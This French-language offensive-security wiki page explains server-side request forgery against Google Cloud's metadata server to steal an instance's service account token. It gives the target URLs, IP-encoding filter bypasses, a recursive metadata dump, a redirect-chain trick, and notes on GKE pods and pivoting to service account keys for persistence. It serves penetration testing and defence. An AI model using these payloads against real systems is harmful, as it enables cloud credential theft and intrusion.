---
title: "SSRF vers les métadonnées : voler le jeton de compte de service via une application hébergée"
description: "Atteindre metadata.google.internal via une falsification de requête côté serveur dans une application hébergée pour voler le jeton de compte de service de l'instance."
keywords:
  - SSRF
  - metadata server
  - service account token
  - Metadata-Flavor
  - request forgery
  - GCE
---

# SSRF vers les métadonnées

Lorsqu'une application s'exécutant sur Compute Engine, GKE ou Cloud Run peut être contrainte d'aller chercher une URL choisie par l'attaquant, pointez-la vers le serveur de métadonnées : la réponse contient le jeton de compte de service de l'instance. C'est le pont entre une vulnérabilité web et des identifiants cloud complets, ce qui explique pourquoi la [SSRF](../../../../../server/web/code/injection/request-forgery/index.md) est traitée ici comme une technique d'accès aux identifiants cloud.

## La requête centrale

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

Les métadonnées GCP exigent l'en-tête `Metadata-Flavor: Google` (les déploiements plus anciens honoraient aussi `X-Google-Metadata-Request: True`). Une SSRF qui ne peut pas définir d'en-têtes échoue face à un serveur au comportement correct : les cas exploitables sont donc les sinks qui transmettent les en-têtes, ceux qui suivent une redirection vers une URL que vous contrôlez et qui définit ensuite l'en-tête, ou les endpoints hérités.

## Contournements

```
# alternate host spellings for IP/host filters
http://metadata.google.internal/  ->  http://169.254.169.254/
                                       http://[::ffff:169.254.169.254]/
                                       http://2852039166/            (decimal)
# recursive dump once you can reach it
.../computeMetadata/v1/?recursive=true&alt=json
# redirect chain: SSRF -> attacker redirector that responds with the header -> metadata
```

## Notes d'exploitation

- La mécanique de la SSRF web (sinks, filtres, injection d'en-têtes, DNS rebinding) est traitée dans [request forgery](../../../../../server/web/code/injection/request-forgery/index.md) ; cette page ne fournit que la charge utile GCP.
- Les pods GKE atteignent souvent le serveur de métadonnées du nœud sauf si Workload Identity et la dissimulation des métadonnées sont imposées ; une SSRF dans un pod livre alors le compte de service du nœud.
- Une fois le jeton exfiltré, les scopes et les rôles du compte attaché déterminent la portée ; pivotez vers les [clés de compte de service](../service-account-keys.md) pour la persistance.

## Outils

- **Burp Suite** / scripts personnalisés pour piloter le sink SSRF.
- **gcloud** / **curl** une fois le jeton exporté.

## Références

- [Hacking the Cloud: GCP metadata SSRF](https://hackingthe.cloud/)
- [HackTricks Cloud: GCP SSRF to metadata](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Google: metadata security](https://cloud.google.com/compute/docs/metadata/overview)
